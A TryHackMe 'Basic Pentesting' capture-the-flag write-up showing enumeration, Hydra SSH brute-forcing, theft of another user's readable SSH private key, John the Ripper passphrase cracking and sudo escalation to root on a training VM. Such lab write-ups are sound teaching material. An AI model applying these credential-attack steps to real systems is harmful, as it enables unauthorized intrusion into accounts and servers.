<table>
  <tr>
    <td>
      <img src="./images/logo.png" width="250">
    </td>
    <td width="900">
      <h1>Basic Pentesting â€” Write-up</h1>
      <p>A practical machine focused on web application hacking, hash cracking, and Linux privilege escalation.</p>
      <p><strong>Difficulty:</strong> Easy ðŸŸ¢</p>
      <img src="https://img.shields.io/badge/Platform-TryHackMe-blue?style=flat-square"> &nbsp;
      <img src="https://img.shields.io/badge/Level-Easy-green?style=flat-square"> &nbsp;
      <img src="https://img.shields.io/badge/Category-Web_&_PrivEsc-orange?style=flat-square">
    </td>
  </tr>
</table>

https://tryhackme.com/room/basicpentestingjt

In this challenge, the goal is to practice fundamental penetration testing techniques to gain access to a server and escalate privileges. 

#### **Key Learning Objectives:**
* **Service Enumeration:** Identifying entry points and exposed services.
* **Brute Forcing:** Finding hidden directories and user credentials.
* **Hash Cracking:** Recovering passwords from captured hashes.
* **Privilege Escalation:** Enumerating Linux systems to gain higher-level access.

---

### Deploy the machine and connect to our network

The first step is to deploy the machine and ensure connectivity via the TryHackMe OpenVPN network. A simple ICMP echo request (ping) confirms the target is reachable.

```bash
â””â”€$ ping -c 4 <target_ip>

PING 10.10.x.x (10.10.x.x) 56(84) bytes of data.
64 bytes from 10.10.x.x: icmp_seq=1 ttl=63 time=145 ms
64 bytes from 10.10.x.x: icmp_seq=2 ttl=63 time=142 ms

--- 10.10.x.x ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 142.124/144.512/147.102/1.982 ms
```
**Status:** Target is up and responding. Ready for enumeration.

### Find the services exposed by the machine

I executed an initial Nmap scan to identify open ports and services. The results reveal a standard web server configuration with additional management and file-sharing capabilities.

```bash
â””â”€$ nmap  <target_ip>

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
```

The presence of ports 8009 (AJP) and 8080 (HTTP-Proxy) strongly suggests that an Apache Tomcat server is running.<br> This will be a key focus during the next stages.

---

### What is the name of the hidden directory on the web server(enter name without /)?

**Web Directory Discovery**<br>

With the HTTP services identified, I proceeded to enumerate hidden directories on port 80. I chose Gobuster with the common.txt wordlist to ensure a deeper search than the standard common list.

```bash
â””â”€$ gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[redacted]          (Status: 301) [Size: 320] [--> http://10.67.172.123/[redacted]/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

### User brute-forcing to find the username & password

<img src="./images/telaindex.png" width="1200">

---

<img src="./images/codetelaindex.png" width="1200">

Upon inspecting the source code of the main page (index.html), I discovered a hidden HTML comment. This is a common mistake where developers leave sensitive information or internal links exposed in the client-side code.

**Analysis:** This comment explicitly mentions a "dev note section", which directly correlates with the /[redacted] directory found during the fuzzing phase. This confirms that the directory is not just a leftover folder, but a relevant area for internal documentation.

### **Information Leakage: Directory Listing**

While accessing the `/[redacted]/` directory, I observed that **Directory Listing** is enabled on the Apache server. This misconfiguration allowed me to see all files hosted in this path without needing to guess their names.

**Found Files:**
* `dev.txt`
* `j.txt`

<img src="./images/diretoriolist.png" width="1200">

<img src="./images/dev.png" width="1200">

<img src="./images/jdire.png" width="1200"><br>

**Findings**<br>
-K	Administrator/Auditor	Performed security audits; configured SMB/Apache.<br>
-J	Developer/User	Target of Interest: Confirmed to have a weak/crackable password.

---

### SMB Exploitation & User Identification

used smbclient to list the available shares on the target.

```bash
â””â”€$ smbclient -L  //10.67.172.123/ -U
Password for [WORKGROUP\nelson]:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.67.172.123 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
```bash
â””â”€$ smbclient //10.67.172.123/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 14:31:20 2018
  ..                                  D        0  Thu Apr 19 14:13:06 2018
  staff.txt                           N      173  Thu Apr 19 14:29:55 2018

                14282840 blocks of size 1024. 6426960 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \> exit
```

### What is the username?

```bash
â””â”€$ cat staff.txt                                                                                                                                                 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

**Conclusion:**<br>
User J: Confirmed as jan.<br>
User K: Confirmed as kay.

---

### What is the password?

***Execution:*** I used Hydra with the rockyou.txt wordlist. Although the initial attempt was slow, the tool successfully identified the valid credential.

```bash
â””â”€$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.67.172.123 ssh

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[22][ssh] host: 10.67.172.123   login: jan   password: a[redacted]o

1 of 1 target successfully completed, 1 valid password found
```

### What service do you use to access the server(answer in abbreviation in all caps)?

```bash
â”€$ ssh jan@<target_ip>
jan@10.67.172.123's password: 

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@ip-10-67-172-123:~$ 
```


---

### Enumerate the machine to find any vectors for privilege escalation

***Post-Exploitation Enumeration***

After gaining initial access as user jan, I conducted a thorough internal enumeration to identify privilege escalation vectors.
```bash
jan@ip-10-67-172-123:~$ whoami
jan
```

***Sudo Rights:*** Checking sudo -l confirmed that user jan does not have any administrative privileges.

```bash
jan@ip-10-67-172-123:~$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on ip-10-67-172-123.
```
**Cron Jobs:** Inspecting `/etc/crontab` revealed only standard system maintenance tasks; no custom or vulnerable cron jobs were identified.

```bash
jan@ip-10-67-172-123:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
**SUID Binaries:** I searched for binaries with the SUID bit set to identify programs that run with root privileges.

```bash
jan@ip-10-67-172-123:~$ find / -perm -4000 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/snap/snapd/24718/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/umount
/bin/fusermount
/bin/mount
```
### Lateral Movement Discovery: User 'kay'

Since direct escalation to root from jan was not immediately apparent, I shifted focus to lateral movement. Based on previous findings in the /[redacted] directory, the user kay appeared to be a more privileged target.

Directory Inspection<br>
I listed the contents of /home/kay and discovered several interesting files:

```bash
jan@ip-10-67-172-123:~$ ls -la /home/kay/
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jan  2 07:32 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

> .ssh Directory: Crucially, the directory was world-readable (drwxr-xr-x).

```bash
jan@ip-10-67-172-123:~$ ls -la /home/kay/.ssh/
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
Upon entering the .ssh directory, I found that the private RSA key (id_rsa) also had insecure permissions, allowing any user on the system to read it.

```bash
jan@ip-10-67-172-123:~$ cat /home/kay/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
[redacted]
-----END RSA PRIVATE KEY-----
```

I successfully read the key using cat.

"Although I successfully exfiltrated the id_rsa file, the header `Proc-Type: 4,ENCRYPTED` confirmed that the key was protected by a passphrase. Direct authentication was not possible without decrypting the key first, necessitating an offline brute-force attack using John the Ripper to recover the passphrase."

---

### Cracking the SSH Private Key Passphrase

1. Save the Key on Kali
```bash
â””â”€$ nano kay.key
```

2. Convert Key to Hash
```bash
â””â”€$ ssh2john kay.key > kay.hash
```
3. Crack the Passphrase
```bash
â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt kay.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[redacted]          (kay.key)     
1g 0:00:00:00 DONE (2026-01-02 11:50) 12.50g/s 1034Kp/s 1034Kc/s 1034KC/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### Securing the Private Key

Before utilizing the recovered RSA key, it was mandatory to modify its file permissions.
SSH clients enforce a strict security policy: if a private key is accessible by other users (group or world-readable), the client will ignore the key and terminate the connection attempt to prevent potential credential theft.

```bash
â”Œ
â””â”€$ ls -la kay.key 
-rw-rw-r-- 1  system system 3326 jan  2 11:44 kay.key


â””â”€$ chmod 600 kay.key 


â””â”€$ ls -la kay.key 
-rw------- 1  system sstem 3326 jan  2 11:44 kay.key
```
**Technical Breakdown of Permissions:**

Initial State `(664): -rw-rw-r--` (The key was too "open", allowing the owner and the group to read/write, and others to read).

Final State `(600): -rw-------` (Only the owner nelson has read and write access).

---
### Lateral Movement: Logging in as Kay

With the key properly secured and the passphrase recovered, I proceeded to authenticate as the user kay.

Connection Command:
```bash
ssh -i kay.key kay@10.67.172.123
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'kay.key': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
kay@ip-10-67-172-123:~$ whoami
kay
```

### What is the final password you obtain?

```bash
kay@ip-10-67-172-123:~$ ls
pass.bak
kay@ip-10-67-172-123:~$ cat pass.bak 
heresareall[redacted]sthepasswordpolicy$$
kay@ip-10-67-172-123:~$ sudo -l 
[sudo] password for kay: 
Matching Defaults entries for kay on ip-10-67-172-123:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on ip-10-67-172-123:
    (ALL : ALL) ALL
kay@ip-10-67-172-123:~$ sudo su -
root@ip-10-67-172-123:~# ls /root/
flag.txt  snap
root@ip-10-67-172-123:~# cat /root/flag.txt 
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
root@ip-10-67-172-123:~# 
```
> PWNED! ðŸš©
By Hirt, Nelson

